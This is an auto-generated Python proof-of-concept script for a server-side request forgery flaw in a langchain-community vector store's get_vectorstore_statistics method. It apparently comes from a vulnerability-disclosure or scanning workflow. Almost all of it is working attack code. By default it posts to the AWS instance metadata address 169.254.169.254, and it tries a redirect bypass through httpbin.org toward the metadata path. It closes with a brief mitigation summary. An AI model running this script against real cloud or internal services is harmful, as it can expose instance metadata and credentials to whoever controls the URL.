#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_url_concatenating_self_get_vectorstore_statistics_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via get_vectorstore_statistics in langchain-community-only

Vulnerability: The get_vectorstore_statistics method constructs a URL by
concatenating self.url with '/v1/statistics' and makes a POST request.
self.url is set from user input during initialization with no validation,
allowing an attacker to control the target host/port/path.

This PoC demonstrates:
1. SSRF to an internal service (e.g., cloud metadata endpoint)
2. SSRF via redirect bypass (if the target redirects)
3. The response is returned to the caller, enabling reflective SSRF

Usage:
    python3 poc_ssrf.py [target_url]

    If no target is provided, defaults to http://169.254.169.254 (AWS metadata)
"""

import sys
import requests
import json
from urllib.parse import urljoin

# Default target - AWS metadata endpoint (internal IP)
DEFAULT_TARGET = "http://169.254.169.254"

# The vulnerable class (simplified from langchain_community.vectorstores.pathway)
class VulnerableVectorStore:
    """Simulates the vulnerable vector store class."""
    
    def __init__(self, url: str):
        """
        Initialize with attacker-controlled URL.
        This is the entry point where untrusted input is accepted.
        """
        self.url = url.rstrip('/')  # Remove trailing slash for clean concatenation
        
    def get_vectorstore_statistics(self):
        """
        Vulnerable method: constructs URL by concatenation and makes POST request.
        No validation, allowlist, or sanitization of the URL.
        """
        # Construct the full URL - this is the sink
        url = self.url + "/v1/statistics"
        
        print(f"[*] Making POST request to: {url}")
        
        try:
            # Make the POST request - requests follows redirects by default
            response = requests.post(
                url,
                json={},
                headers={"Content-Type": "application/json"},
                timeout=10,  # Add timeout to prevent hanging
                allow_redirects=True  # Default, but explicit for clarity
            )
            
            print(f"[*] Response status code: {response.status_code}")
            print(f"[*] Response headers: {dict(response.headers)}")
            
            # Try to parse as JSON (as the original code does)
            try:
                responses = response.json()
                print(f"[*] Response JSON: {json.dumps(responses, indent=2)}")
            except json.JSONDecodeError:
                print(f"[*] Response text (not JSON): {response.text[:500]}")
            
            return response
            
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {e}")
            print("[!] Target may not be reachable or does not exist")
        except requests.exceptions.Timeout as e:
            print(f"[!] Timeout error: {e}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
        
        return None


def demonstrate_ssrf(target_url: str):
    """
    Demonstrate SSRF by creating a VulnerableVectorStore with attacker-controlled URL.
    """
    print(f"\n{'='*60}")
    print(f"SSRF PoC - Target: {target_url}")
    print(f"{'='*60}\n")
    
    # Create the vulnerable instance with attacker-controlled URL
    store = VulnerableVectorStore(target_url)
    
    # Trigger the vulnerable method
    result = store.get_vectorstore_statistics()
    
    if result:
        print(f"\n[+] SSRF successful! Response received from: {target_url}")
        print(f"[+] This demonstrates that the attacker can control the target URL")
        print(f"[+] and receive the response (reflective SSRF)")
    else:
        print(f"\n[-] SSRF failed or target unreachable")
    
    return result


def demonstrate_redirect_bypass():
    """
    Demonstrate SSRF via redirect bypass.
    Some services may block direct access to internal IPs but allow redirects.
    """
    print(f"\n{'='*60}")
    print("Redirect Bypass Demonstration")
    print(f"{'='*60}\n")
    
    # This would be an attacker-controlled server that redirects to internal IP
    # For demonstration, we use a public redirect service (httpbin.org)
    redirect_url = "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"
    
    print(f"[*] Using redirect URL: {redirect_url}")
    print(f"[*] This simulates an attacker server that redirects to internal IP")
    
    store = VulnerableVectorStore(redirect_url)
    result = store.get_vectorstore_statistics()
    
    if result:
        print(f"\n[+] Redirect SSRF successful!")
        print(f"[+] The request followed the redirect to the internal IP")
    else:
        print(f"\n[-] Redirect SSRF failed (expected if httpbin.org is unreachable)")
        print(f"[-] In a real attack, the attacker would control the redirect server")


def main():
    """Main function to run the PoC."""
    
    # Get target from command line or use default
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = DEFAULT_TARGET
        print(f"[*] No target specified, using default: {target}")
        print(f"[*] To target a different service, run: python3 {sys.argv[0]} <url>")
    
    print(f"\n{'#'*60}")
    print(f"# SSRF Proof-of-Concept for langchain-community-only")
    print(f"{'#'*60}\n")
    
    print("[*] Vulnerability: get_vectorstore_statistics constructs URL from")
    print("[*] self.url without validation, allowing SSRF to internal services")
    print("[*] The response is returned to the caller (reflective SSRF)\n")
    
    # Demonstrate basic SSRF
    demonstrate_ssrf(target)
    
    # Demonstrate redirect bypass (optional, may fail if external services unreachable)
    print(f"\n{'='*60}")
    print("Note: Redirect bypass demonstration requires internet access")
    print(f"{'='*60}")
    try:
        demonstrate_redirect_bypass()
    except Exception as e:
        print(f"[!] Redirect demonstration failed: {e}")
    
    print(f"\n{'='*60}")
    print("Summary")
    print(f"{'='*60}")
    print("[*] The vulnerable code path:")
    print("    1. User provides URL during initialization")
    print("    2. get_vectorstore_statistics concatenates URL with '/v1/statistics'")
    print("    3. POST request is made to the attacker-controlled URL")
    print("    4. Response is returned to the attacker")
    print("\n[*] Impact: SSRF to internal services (cloud metadata, internal APIs)")
    print("[*] Mitigation: Validate/allowlist URLs, use URL parsing, disable redirects")


if __name__ == "__main__":
    main()
